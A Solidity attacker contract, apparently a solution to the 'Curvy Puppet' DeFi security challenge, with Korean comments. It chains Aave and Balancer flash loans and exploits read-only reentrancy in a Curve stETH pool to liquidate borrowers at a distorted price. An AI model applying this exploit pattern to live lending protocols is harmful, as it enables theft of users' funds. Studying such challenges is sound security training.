pragma solidity =0.8.25;
import {IStableSwap} from "./IStableSwap.sol";
import {WETH} from "solmate/tokens/WETH.sol";


interface ICurvyPuppetLending{
    function liquidate(address target) external;
    function getBorrowValue(uint256 amount) external view returns (uint256);
}

interface IERC20{
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IWstETH {
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}



interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IFlashLoanRecipient {
        function receiveFlashLoan(
            address[] calldata tokens,
            uint256[] calldata amounts,
            uint256[] calldata feeAmounts,
            bytes calldata userData
        ) external;
}




interface ILendingPool {
    struct ReserveData {
        uint256 availableLiquidity;
        uint256 totalStableDebt;
        uint256 totalVariableDebt;
        uint256 liquidityRate;
        uint256 variableBorrowRate;
        uint256 stableBorrowRate;
        uint256 averageStableBorrowRate;
        uint256 liquidityIndex;
        uint256 variableBorrowIndex;
        uint40 lastUpdateTimestamp;
    }

    function getReserveData(address asset) external view returns (ReserveData memory);

    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IPermit2 {
    struct PermitSingle {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct SignatureTransferDetails {
        address to;
        uint256 requestedAmount;
    }

    function permitTransferFrom(
        PermitSingle calldata permit,
        SignatureTransferDetails calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;

    function approve(address token, address spender, uint160 amount, uint48 expiration) external;
}


event MyValue(uint256 borrowValue);

contract CurvyAttacker is IFlashLoanRecipient{
    IStableSwap swap; 
    ICurvyPuppetLending lending;
    address tresury;
    WETH weth;
    IERC20 lptoken;
    address a;
    address b;
    address c;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    address aavepool = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    ILendingPool lendingPool = ILendingPool(aavepool);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IPermit2 permit;
    address player;
    address public constant wst_eth = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    IWstETH WSTETH = IWstETH(wst_eth);
    IERC20 dvt; 


    constructor(address _swap, address _lending, address _tresury, address payable _weth, address _lptoken, address _a, address _b, address _c, address _permit, address _player, address _dvt){
        swap = IStableSwap(_swap);
        lending = ICurvyPuppetLending(_lending);
        tresury = _tresury;
        weth = WETH(_weth);
        lptoken = IERC20(_lptoken);
        a = _a;
        b = _b;
        c = _c;
        permit = IPermit2(_permit);
        player = _player;
        dvt = IERC20(_dvt);
    }

    function attack() public{      
        address[] memory assets = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        uint256[] memory modes = new uint256[](2);

        uint256 wEthflashLoanAmount = 30000 ether; 
        uint256 stEthflashLoanAmount = 172000 ether; 
        assets[0] = address(weth);
        assets[1] = address(stETH);
        amounts[0] = wEthflashLoanAmount;
        amounts[1] = stEthflashLoanAmount;
        modes[0] = 0;
        modes[1] = 0;

        lendingPool.flashLoan(
            address(this),
            assets,
            amounts,
            modes, 
            address(this),
            "",
            0
        );
    }

    // 1. aave 플래시론 반환
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        weth.approve(aavepool, type(uint256).max);
        stETH.approve(aavepool, type(uint256).max);

        uint256 wEthflashLoanAmount = 37991917252778937136234;
        address[] memory tokens = new address[](1);
        uint256[] memory f_amounts = new uint256[](1);       
        tokens[0] = address(weth);
        f_amounts[0] = wEthflashLoanAmount;
        
        // 낮은 수수료에   weth 보유량을 더 늘리기 위해 한번 더 FLASHLOAN (Balnacer : 수수료 무료)
        IVault(BALANCER_VAULT).flashLoan(
            IFlashLoanRecipient(address(this)),
            tokens,
            f_amounts,
            ""
        );
        
        weth.withdraw(weth.balanceOf(address(this)));
        uint256 remainedETH = address(this).balance- (amounts[0]+premiums[0]);
        swap.exchange{value: remainedETH}(0,1,remainedETH,0);
        weth.deposit{value: address(this).balance}();
        emit MyValue(weth.balanceOf(address(this)));
        
        return true;
    }

    //2. balancer 플래시론 반환 
    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external override {
        require(msg.sender == BALANCER_VAULT, "Only Balancer Vault");
        weth.withdraw(weth.balanceOf(address(this)));
        uint256 lptoken_amounts = addLiquidity();
        removeLiquidity(lptoken.balanceOf(address(this))-3e18); // read only reentrancy attack occured in fallback..
        
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(BALANCER_VAULT),37991917252778937136234); // Balancer 풀에 상환
        //58000000000000000000000 
        //37991917252778937136234
    }

    function addLiquidity() internal returns (uint256){
        stETH.approve(address(swap),stETH.balanceOf(address(this)));
        
        uint256[2] memory amountsToAdd = [address(this).balance, stETH.balanceOf(address(this))];
        uint256 receivedLpAmount = swap.add_liquidity{value: address(this).balance}(amountsToAdd, 0);

        return receivedLpAmount;
    }

    function removeLiquidity(uint256 amount) internal{
        //function approve(address token, address spender, uint160 amount, uint48 expiration) external
        uint256[2] memory removeAmounts = [uint256(0), uint(0)];
        //permit.approve(address(lptoken), address(lending), uint160(lptoken.balanceOf(address(this))),0);
        lptoken.approve(address(swap),lptoken.balanceOf(address(this)));
        lptoken.approve(address(lending),lptoken.balanceOf(address(this)));
        swap.remove_liquidity(amount, removeAmounts);
    }


    fallback() external payable {
    // Fallback logic
        if(msg.sender==address(swap) ){
           // 충분한 LP토큰이 없음.. ㄴㄴ 있다. 
           
           lptoken.approve(address(permit),lptoken.balanceOf(address(this)));
           permit.approve(address(lptoken), address(lending), uint160(lptoken.balanceOf(address(this))) , uint48(block.timestamp+3600));
           lending.liquidate(a); // 1e18 LP 토큰을 뽑아감.
           lending.liquidate(b);
           lending.liquidate(c);

           dvt.transfer(tresury,dvt.balanceOf(address(this)));
           
        }   
    }

}